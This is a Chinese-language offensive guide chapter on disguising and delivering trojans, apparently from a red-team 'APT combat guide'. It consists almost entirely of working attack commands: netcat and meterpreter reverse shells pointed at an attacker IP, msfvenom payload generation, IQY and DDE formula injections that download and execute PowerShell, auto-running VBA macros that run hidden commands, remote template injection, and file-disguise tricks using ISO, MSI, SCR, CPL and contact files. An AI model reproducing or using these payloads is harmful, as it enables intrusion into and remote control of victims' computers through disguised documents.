# 木马投递

## 恶意软件伪装

### 文件伪装

1. 快捷方式伪装

(1)

[lnk.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/lnk.ps1)

(2)

[ico.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/ico.ps1)

[download.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/download.ps1)

hi.exe:

```bash
msfvenom -p windows/x64/messagebox TEXT='There is payload!' TITLE='Ghost Wolf Lab' -f exe > hi.exe
```

(3)

[ole.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/ole.ps1)

nc.cmd:

```bash
C:\Users\Administrator\Desktop\nc.exe IP地址 4444 -e cmd.exe  
//嵌入攻击者主机IP地址
```

2. CHM文件

[nc.html](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/nc.html)

```bash
nc -lvp 4444
```

nishang:

```bash
Import-Module .\Out-CHM.ps1
out-chm -payload "C:\Users\Administrator\Desktop\nc.exe -e powershell IP地址 5555" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
nc -lvp 5555
```

3. IQY文件

test.iqy:

```bash
WEB
1
https://www.baidu.com/robots.txt
```

calc.dat:

```bash
=cmd|' /C calc'!notthissheet
```

calc.iqy:

```bash
WEB
1
http://IP地址/payload/calc.dat
```

(1)

```bash
Start-CaptureServer -AuthType Basic -IPAddress IP地址 -LogFilePath log.txt
```

login.dat:

```bash
=cmd|' /C start iexplore http://IP地址/'!notthissheet
```

auth.iqy:

```bash
WEB
1
http://IP地址/payload/login.dat
```

(2)

```bash
=cmd|' /C C:\Users\Administrator\Desktop\nc.exe IP地址 4444 -e cmd.exe'!notthissheet
```

```bash
=cmd|' /C powershell.exe "IEX(New-Object Net.WebClient).DownloadString('http://IP地址/nishang/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress IP地址 -Port 4444"'!notthissheet
```

4. REG文件

[malicious.reg](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/malicious.reg)

5. VBS文件

[evil.vbs](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/evil.vbs)

6. JScript文件

[evil.js](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/evil.js)

7. ISO文件

```bash
apt-get install genisoimage
mkisofs -o malicious.iso -V "Update" -J -R hi.exe
```

8. MSI文件

```bash
msfvenom执行msfvenom -p windows/x64/messagebox TEXT='Hi,There is a payload!' TITLE='Ghost Wolf Lab' -f msi > evil.msi
```

9. SCR文件

```bash
msfvenom执行msfvenom -p windows/x64/messagebox TEXT='Hi,There is a payload!' TITLE='Ghost Wolf Lab' -f exe > payload.exe
payload.exe > payload.scr
```

10. 联系人文件

(1)

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP地址 lport=4444 -f dll > shell.dll
```

```bash
http.\\www.ghostwolflab.com.cpl
shell.dll > www.ghostwolflab.com.cpl
```

(2)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=5555 -f vbs > shell.vbs
```

```bash
<a href="vbs\shell.vbs">snowwolf@admin.com</a>
```

11. CPL文件

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP地址 lport=4444 -f dll > shell.dll
```

### 宏病毒

弹窗宏:

```vba
Private Sub Document_Open()
  MsgBox "Hi,I am snowwolf.", vbOKOnly, "Ghost Wolf Lab"
End Sub
```

1. Metasploit框架生成宏

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f vba-psh > vba
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f vba-exe
```

2. 页面替换宏

[page.vba](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/page.vba)

3. Regsvr32方法

[evil.sct](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/evil.sct)

[Regsvr32下载](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/Regsvr32下载)

4. Author属性

```bash
powershell -NoP -ExecutionPolicy Bypass -Command IEX ((New-Object Net.WebClient).DownloadString('http://IP地址/payload/hacker.ps1'))
```

hacker.ps1 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f psh-cmd

```bash
Sub AutoOpen()
    ' 读取Author属性中的恶意代码
    Dim strCmd As String
    strCmd = ActiveDocument.BuiltInDocumentProperties("Author").Value
    ' 执行恶意代码
    Shell strCmd, vbHide
End Sub
```

5. 基于ActiveX的自动运行宏

[嵌入ActiveX自动运行宏](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/嵌入ActiveX自动运行宏)

active.ps1 > msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f psh-cmd > active.ps1

6. 基于Certutil直接下载并运行

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f exe > cer.exe
```

[Certutil下载并运行](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/Certutil下载并运行)

7. 远程模板注入

[远程模板VBA](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/远程模板VBA)

file name = http://192.168.0.189/payload/evil.dotm

8. DDE

```bash
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://IP地址/payload/active.ps1')"}
```

Excel:

```bash
=cmd|'/c cmd.exe /c powershell.exe -nop -w hidden iwr -outf %tmp%\\excel.vbs http://IP地址/payload/excel.vbs & %tmp%\\excel.vbs'!'A1'
```

excel.vbs:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP地址 LPORT=4444 -f vbs > excel.vbs
```

9. Excel XLM宏

```bash
=EXEC("C:\\Users\\Administrator\\Desktop\\nc.cmd")
=HALT()
```
